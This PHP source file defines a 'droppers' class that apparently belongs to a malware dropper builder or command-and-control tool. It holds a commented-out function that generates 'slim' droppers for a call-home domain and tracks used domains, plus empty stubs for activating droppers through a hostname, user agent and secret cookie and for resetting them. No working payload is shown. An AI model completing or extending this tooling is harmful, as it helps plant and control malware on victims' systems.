<?php
namespace tooling;
use dynamic_generator;


class droppers
{
//    function createDropper($callHome)
//    {
//        echo "Starting dropper creation\n";
//        $t = new dynamic_generator();
//        $inDB = new postgres_checker();
//        if (!empty($callHome)) {
//            try {
//                $rtValues = $t->slim_dropper($callHome, '', true);
//                $inDB->countUsedDomains($callHome);
//                system("ls -lah ../droppers/dynamic/slim");
//                print("\n\nPress M to return to the menu.\n");
//
//            } catch (Exception $exception) {
//                $empty = array(
//                    "Callhome" => $callHome,
//                    "Actual Exception" => $exception
//                );
//                logo('cr', clears, true, $empty, '');
//            }
//
//        } else {
//            $empty = array(
//                "Callhome" => $callHome,
//            );
//            logo('cr', clears, true, $empty, '');
//        }
//    }

    function activate_dropper(string $hostname, string $user_agent, string $cookie_name, string $cookie_value, string $post_value){

    }

    function reset_dropper(string $hostname, string $dropper_location){

    }

}